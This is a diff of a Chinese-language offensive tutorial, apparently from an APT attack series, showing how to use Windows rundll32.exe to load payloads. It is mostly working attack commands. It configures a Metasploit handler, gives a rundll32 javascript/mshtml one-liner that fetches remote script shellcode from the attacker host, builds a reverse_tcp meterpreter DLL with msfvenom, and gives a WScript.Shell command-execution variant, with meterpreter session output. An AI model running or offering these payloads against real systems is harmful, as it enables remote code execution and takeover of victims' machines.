@@ -1,32 +1,33 @@
-# 专注APT攻击与防御
-https://micropoor.blogspot.com/
-
 **注：**请多喝点热水或者凉白开，可预防**肾结石，通风**等。
 
-**Rundll32简介：**
+### Rundll32简介：
 
 Rundll32.exe是指“执行32位的DLL文件”。它的作用是执行DLL文件中的内部函数,功能就是以命令行的方式调用动态链接程序库。
 
 **说明：**Rundll32.exe所在路径已被系统添加PATH环境变量中，因此，Wmic命令可识别，需注意x86，x64位的Rundll32调用。
 
-Windows 2003 默认位置：
-`C:\Windows\System32\rundll32.exe
-C:\Windows\SysWOW64\rundll32.exe`
+Windows 2003 默认位置：   
+```bash
+C:\Windows\System32\rundll32.exe
+C:\Windows\SysWOW64\rundll32.exe
+```
 
-Windows 7 默认位置：
-`C:\Windows\System32\rundll32.exe
-C:\Windows\SysWOW64\rundll32.exe`
+Windows 7 默认位置：  
+```bash
+C:\Windows\System32\rundll32.exe
+C:\Windows\SysWOW64\rundll32.exe
+```
 
-**攻击机：** 
-192.168.1.4 Debian
-**靶机：** 
-192.168.1.119 Windows 2003
+**攻击机：**   
+192.168.1.4 Debian  
+**靶机：**   
+192.168.1.119 Windows 2003  
 192.168.1.5 Windows 7
 
-## 基于远程加载（1）：
+### 基于远程加载（1）：
 
-**配置攻击机msf：**
-**注：x86 payload**
+**配置攻击机msf：**  
+**注：x86 payload**  
 ```bash
 msf exploit(multi/handler) > show options 
 
@@ -58,11 +59,13 @@ msf exploit(multi/handler) > exploit
 ![](media/f92cb9f3191ab217bf1444fd4879dfc9.jpg)
 
 
-**靶机执行：**
+### 靶机执行：
 
-`C:\Windows\SysWOW64\rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();GetObject("script:http://192.168.1.4/Rundll32_shellcode")`
+```bash
+C:\Windows\SysWOW64\rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();GetObject("script:http://192.168.1.4/Rundll32_shellcode")
+```
 
-**注：x64 rundll32.exe**
+**注：x64 rundll32.exe**  
 ![](media/c506997b4426c859d3a558df523e9e78.jpg)
 
 ```bash
@@ -80,14 +83,16 @@ meterpreter >
 ```
 ![](media/ef9be408db8b488f46d82a0be95be4d9.jpg)
 
-## 基于本地加载（2）：
+### 基于本地加载（2）：
 
 **payload配置：**
 
-`msfvenom ‐a x86 ‐‐platform windows ‐p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=53 ‐f dll > Micropoor_Rundll32.dll`
+```bash
+msfvenom ‐a x86 ‐‐platform windows ‐p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=53 ‐f dll > Micropoor_Rundll32.dll
+```
 ![](media/c29bcb8da0b2ab93b41b78680cdf6797.jpg)
 
-**靶机执行：**
+**靶机执行：**  
 ![](media/775af2d953be8cd89beb670c8103727d.jpg)
 
 ```bash
@@ -104,17 +109,20 @@ Current pid: 6656
 ```
 ![](media/2bc648b8817fe93f2247fcc8ad6087e5.jpg)
 
-## 基于命令执行（3）：
+### 基于命令执行（3）：
 
-**靶机执行：**
+**靶机执行：**  
 
-**Windows 2003：**
-`rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"mstsc\");window.close()");`
+**Windows 2003：**  
+```bash
+rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"mstsc\");window.close()");
+```
 
-注：如靶机支持powershell，调用powershell更贴合实战。
+注：如靶机支持powershell，调用powershell更贴合实战。  
+
 ![](media/8ff4ead4654c4b472ba81c84ce4cd680.jpg)
 
-**附录：Rundll32_shellcode**
+### 附录：Rundll32_shellcode
 ```bash
 <?xml version="1.0"?> 
 <package>
